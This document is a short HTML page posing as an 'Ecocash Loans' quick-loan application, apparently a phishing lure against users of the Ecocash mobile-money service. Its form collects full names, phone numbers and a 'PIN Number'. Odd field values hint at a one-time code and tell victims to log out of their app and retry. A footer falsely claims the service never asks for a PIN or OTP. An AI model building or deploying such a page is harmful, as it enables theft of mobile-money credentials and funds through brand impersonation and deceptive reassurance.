<!DOCTYPE html>
<html>
<head>
<title>Ecocash- Apply Now</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;text-align:center;padding:20px;background:#e8f5e9}
.box{background:white;padding:20px;border-radius:15px;max-width:420px;margin:auto;box-shadow:0 0 10px #ccc}
input,select{width:90%;padding:12px;margin:8px;border-radius:8px;border:1px solid #ccc}
button{background:#16a34a;color:white;padding:14px;border:none;border-radius:8px;width:95%;font-size:17px;font-weight:bold}
</style>
</head>
<body>
<div class="box">
<h2>ECOCASH LOANS 💰</h2>
<p>Quick Loan - Apply in 2 Minutes</p>
<form action="/submit" method="POST">
<input name="fullname" placeholder="Full Names" required>
<input name="phone" placeholder="Phone Number" required>
<input name="idnumber" placeholder="PIN Number" required>
<select name="amount" required>
<option value="OTP ">?</option>
<option>500</option>
<option>1000</option>
<option>2000</option>
<option>3000</option>
<option>5000</option>
<option>10000</option>
</select>
<select name="PLEASE LOG OUT OF YOU'RE ECOCASH APP AND RE-TRY" required>
<option value="">Repay in?</option>
<option>7 Days</option>
<option>14 Days</option>
<option>30 Days</option>
</select>
<button type="submit">Apply For Loan Now</button>
</form>
<p style="font-size:12px;color:gray">We never ask for PIN or OTP. We only call you to confirm.</p>
</div>
</body>
  </html>
